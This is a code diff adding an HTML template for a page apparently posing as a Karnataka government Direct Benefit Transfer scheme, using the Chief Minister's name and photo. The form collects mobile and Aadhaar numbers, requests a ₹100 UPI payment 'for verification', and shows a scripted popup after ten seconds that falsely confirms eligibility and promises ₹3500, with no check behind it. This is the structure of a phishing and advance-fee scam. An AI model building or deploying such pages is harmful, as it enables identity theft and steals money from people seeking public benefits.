@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>DBT Application</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+  <script src="{{ url_for('static', filename='lang_toggle.js') }}"></script>
+</head>
+<body>
+
+  <header>
+    <img src="{{ url_for('static', filename='siddaramaiah.jpg') }}" alt="CM">
+    <div class="text-group">
+      <div class="gov">ಭಾರತ ಸರ್ಕಾರ | GOVERNMENT OF KARNATAKA</div>
+      <div class="cm-name">CM Siddaramaiah</div>
+    </div>
+  </header>
+
+  <div class="language-toggle" onclick="toggleLanguage()">ಕನ್ನಡ / English</div>
+
+  <div class="container">
+    <h2 id="title">DBT Scheme - Application Form</h2>
+
+    <form method="POST" action="/">
+      <label id="mobileLabel">Mobile Number</label>
+      <input type="text" name="mobile" maxlength="10" pattern="[6-9]\d{9}" required>
+
+      <label id="aadharLabel">Aadhar Number</label>
+      <input type="text" name="aadhar" maxlength="12" pattern="\d{12}" required>
+
+      <button type="submit" id="submitBtn">Proceed</button>
+    </form>
+
+    {% if show_qr %}
+      <div id="qr-section">
+        <p id="payMsg">Please pay ₹100 for verification</p>
+        <img src="{{ url_for('static', filename='upi_qr.png') }}" width="250" height="250" alt="UPI QR">
+        <img src="{{ url_for('static', filename='myscanene.png') }}" width="120" alt="Scanner" style="margin-top: 10px;">
+      </div>
+
+      <script>
+        setTimeout(() => {
+          document.getElementById('success-popup').style.display = 'block';
+        }, 10000); // 10 seconds
+      </script>
+
+      <div id="success-popup">
+        Eligibility confirmed. ₹3500 will be credited in 3–5 days.
+      </div>
+    {% endif %}
+  </div>
+
+</body>
+</html>
